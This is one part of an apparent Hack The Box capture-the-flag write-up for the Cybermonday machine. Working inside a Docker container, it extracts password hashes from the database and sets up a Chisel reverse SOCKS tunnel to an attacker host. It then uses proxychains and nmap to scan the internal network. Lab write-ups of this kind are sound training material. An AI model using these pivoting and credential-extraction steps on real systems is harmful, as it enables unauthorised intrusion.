# HTB Cybermonday - Where to Now?

[Initial Enumeration](/writeups/machines/htb-cybermonday/1-initial-enumeration)
[Webhook API Admin Access](/writeups/machines/htb-cybermonday/2-webhook-api-admin)
[Obtaining More Info](/writeups/machines/htb-cybermonday/3-obtaining-more-info)
[Gaining a Foothold](/writeups/machines/htb-cybermonday/4-gaining-a-foothold)
[**Where to Now?**](/writeups/machines/htb-cybermonday/5-where-to-now)
[Reading the Source](/writeups/machines/htb-cybermonday/6-reading-the-source)
[Composing Root Access](/writeups/machines/htb-cybermonday/7-composing-root-access)

As you do all your regular enumeration you'll quickly realise (if you hadn't already) that this is a [[docker|Docker]] container. Sometimes you can break out of Docker containers, but in this case it seems the vulnerabilities are all covered. One interesting directory is `/mnt`. It looks like a home directory from the host system has been mounted here. You can see the user flag is tantalisingly close, but unfortunately we can't read it at the moment. What about `authorized_keys`? Well it already exists and isn't writeable, but it is readable.
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCy9ETY9f4YGlxIufn... john@cybermonday
```

Now we have a username we can try to use for [[ssh|`ssh`]] to the host. Trying some of the basic passwords to login doesn't get us anywhere so lets continue with our Docker box for now. We have a couple of things we can do from here. We can look through the source code of the entire Cybermonday shopping app, and we can use the MySQL credentials from the `.env` file to connect to the database. The container doesn't have `mysql` installed so you'll have to use a [[php|PHP]] script if you want to do that. With this method we can extract the password hashes for the admin user and your own account:
```
1 - admin - admin@cybermonday.htb - $2y$10$6kJuFazZ...
2 - dot - ctf@dotefekts.net - $2y$10$6xMtStxbhJkEf0...
```

We can try and use `hashcat` to determine the admin password but it doesn't look like it's going to work any time soon. Looking through the code doesn't get us any particularly useful information either. So what else can we do? Well, Docker containers means a Docker network, one that we can now scan to find more services that might not have previously been accessible.
We'll need to know what the IP range of our network is, but `ifconfig` and `ip` are both not available on the container, so instead we can use:
```shell
$ hostname -I

<container ip>
```

So now how do we scan this network? Enter [Chisel](https://github.com/jpillora/chisel) a network tunnel that supports reverse proxy. Download Chisel to both your own device and the container. (As HTB machines don't have an internet connection you will need to use `python3 -m http.server` and then `curl` in the container to download Chisel from your device.) Once you have `chisel` ready to go, you can start the server on your device:
```shell
$ ./chisel server -p 8080 --reverse
```

and then connect to it from the container:
```shell
$ ./chisel client <your ip>:8080 R:socks
```

Once the container is connected, Chisel will tell you the port on your device to use to send traffic through the proxy. Now that we have the proxy, we'll need a way to allow `nmap` to utilise it. For this we'll use [Proxychains](https://github.com/haad/proxychains). You may find `proxychains` is already installed if you're using Pwnbox or Parrot, if not you should be able to obtain it via `sudo apt install proxychains`. Once installed, open `/etc/proxychains.conf`. Comment out `strict_chain` and uncomment `dynamic_chain`. You may also want to enable `quiet_mode` if you don't want your console spammed with failed connections. Comment out `proxy_dns`, and finally add the `SOCKS` proxy from `chisel` to the proxy list at the bottom of the file. Now we're ready to go.

Personally I found that running `nmap` on one IP at a time was far quicker than having it scan a range. This was likely because I've misconfigured something or used a wrong flag, but in any case you can scan the network in whatever fashion you please. As `ICMP` packets can't be sent through the `SOCKS` proxy, you'll need to disable host detection for the scan and use the `Connect` method. As such your command should look something like this:
```
$ proxychains nmap -sT <ip to scan> -Pn -oG logs/docker_1_scan -v
```

Once you've finished scanning, you'll see a number of services we're already aware of, such as Redis, MySQL, and the webhook API. One service that we haven't been aware of so far is one on port `5000`. A quick Google tells us this is likely to be a Docker registry service. 

Next: [Reading the Source](/writeups/machines/htb-cybermonday/6-reading-the-source)